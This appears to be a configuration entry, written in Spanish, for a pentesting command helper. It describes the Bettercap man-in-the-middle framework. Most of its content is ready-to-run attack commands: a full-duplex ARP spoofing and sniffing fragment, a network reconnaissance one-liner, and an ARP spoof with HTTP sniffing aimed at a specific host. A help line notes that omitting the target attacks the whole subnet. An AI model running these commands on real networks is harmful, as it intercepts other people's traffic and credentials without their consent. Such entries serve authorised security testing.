name: Bettercap
summary: Framework interactivo para ataques Man-in-the-Middle, sniffing y spoofing en red local.

options.label: Solo reconocer hosts de la red
ARP spoofing + captura HTTP/HTTPS
options.frag: -eval "net.probe on; set arp.spoof.fullduplex true; arp.spoof on; net.sniff on"

questions.label: IP objetivo (opcional)
questions.help: Si se omite, ataca a toda la subred.

cheats.title: Reconocimiento de red
cheats.cmd: sudo bettercap -iface eth0 -eval "net.probe on; net.recon on; sleep 10; net.show"

cheats.title: ARP spoof + sniff HTTP
cheats.cmd: sudo bettercap -iface eth0 -eval "set arp.spoof.targets 10.10.10.50; arp.spoof on; net.sniff on"
